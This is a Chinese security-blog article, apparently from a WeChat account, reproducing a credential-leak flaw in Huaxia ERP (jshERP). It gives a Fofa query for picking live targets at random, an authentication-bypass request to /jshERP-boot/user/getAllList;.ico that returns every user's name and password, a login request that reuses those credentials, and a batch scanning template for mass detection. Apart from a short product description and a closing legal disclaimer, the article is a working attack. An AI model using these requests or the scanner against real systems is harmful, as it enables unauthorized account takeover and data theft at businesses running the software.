<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uGytcRnWw1-fF34kT6Wk1A)

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZdRu0sU9CL4ibfIuNAp5wrzzPIgh4XGTNxibZLBTtLpxQJx6TMv7SyB52iaawph25aO4aBFEKL9OBpPg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tLV8Gx8km9J2qtZb0RmrJTSUibpbnWUNaZnW7nRmmBic23KZkLCLiajggaRmtCTvK0IM5xyjFtDY8YNCx6dMdWFVQ/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hox1KVQnzGiapffJhGLo1bjRHbxbLYV2cgd54VBV3aEnbiajibjaL4Ya1wz1zNibHzu08s45GibrEaUnQ65dLQawnibA/640)

信息描述

 **华夏 ERP 是一种企业资源规划（ERP）软件，旨在为企业提供全面的信息管理和集成解决方案，以提高效率、降低成本并优化业务流程。该软件可以帮助企业管理各种业务功能，例如财务、销售、采购、库存、生产计划等。它还具有报告和分析功能，使企业能够更好地了解其业务运营情况。华夏 ERP 通常用于中小型企业。华夏 ERP 前台泄露了某 api 接口，恶意攻击者可通过调用该接口，对用户的账号和密码进行非授权访问**。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tLV8Gx8km9J2qtZb0RmrJTSUibpbnWUNaZnW7nRmmBic23KZkLCLiajggaRmtCTvK0IM5xyjFtDY8YNCx6dMdWFVQ/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hox1KVQnzGiapffJhGLo1bjRHbxbLYV2cgd54VBV3aEnbiajibjaL4Ya1wz1zNibHzu08s45GibrEaUnQ65dLQawnibA/640)

漏洞复现

步骤一：在 Fofa 中搜索以下语法并随机确定要进行攻击测试的目标....

```
#Fofa搜索语法
"jshERP-boot"

```

步骤二：开启代理并打开 BP 对其首页进行抓包拦截.... 修改请求头内容.... 在响应包中可以看到 json 格式的用户名密码。

```
GET /jshERP-boot/user/getAllList;.ico HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: */*
Referer: http://1.12.225.89/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZdRu0sU9CL4ibfIuNAp5wrzzvHTEZElK6OBqhu8BaewgnnT8Ped24l2dSzoqR6y8udZmDogl5XFCkA/640?wx_fmt=png&from=appmsg)

步骤三：抓取登录数据包，替换用户名密码即可登入系统。

```
POST /jshERP-boot/user/login HTTP/1.1
Host: yourip
Content-Length: 68
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin:
Referer: 
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
{"loginName":"loginname","password":"password"}

```

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZdRu0sU9CL4ibfIuNAp5wrzzb9Vp5WqFR9o4QSUFzAXaCPrBLDxlvj4GNSUFDbib6AytU1XIJVWicysg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tLV8Gx8km9J2qtZb0RmrJTSUibpbnWUNaZnW7nRmmBic23KZkLCLiajggaRmtCTvK0IM5xyjFtDY8YNCx6dMdWFVQ/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hox1KVQnzGiapffJhGLo1bjRHbxbLYV2cgd54VBV3aEnbiajibjaL4Ya1wz1zNibHzu08s45GibrEaUnQ65dLQawnibA/640)

批量脚本

```
id: huaxiaERP-information-leakage
info:
  name: huaxiaERP-information-leakage
  author:xingyun
  severity: medium
  description: 华夏ERP信息泄露
requests:
  - method: GET
    path:
      - "\{\{BaseURL\}\}/jshERP-boot/user/getAllList;.ico"             
    matchers-condition: and      
    matchers:     
      - type: status
        status:
          - 200
      - type: word
        words:
          - "username"

```

     揽月安全团队发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！！！！！

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZdRu0sU9CL4ibfIuNAp5wrzzshaicaEe4A1HMX41eyc5EqhMiaheSUAWYrq83jpMuTJo6XwfHVOq6UBQ/640?wx_fmt=png&from=appmsg)